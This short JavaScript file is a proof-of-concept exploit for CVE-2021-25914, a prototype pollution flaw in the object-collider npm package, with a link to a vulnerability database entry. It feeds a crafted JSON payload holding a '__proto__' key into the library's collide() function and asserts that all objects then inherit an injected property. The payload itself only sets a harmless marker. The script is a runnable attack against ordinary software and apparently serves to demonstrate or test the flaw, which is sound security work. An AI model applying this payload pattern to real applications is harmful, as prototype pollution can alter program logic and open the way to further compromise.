//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25914

const { assert } = require("@firebase/util");
var { collide } = require("object-collider") 
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}'); 
obj = {}
console.log("Before : " + {}.polluted);
collide(obj, payload);

console.log("After : " + {}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");
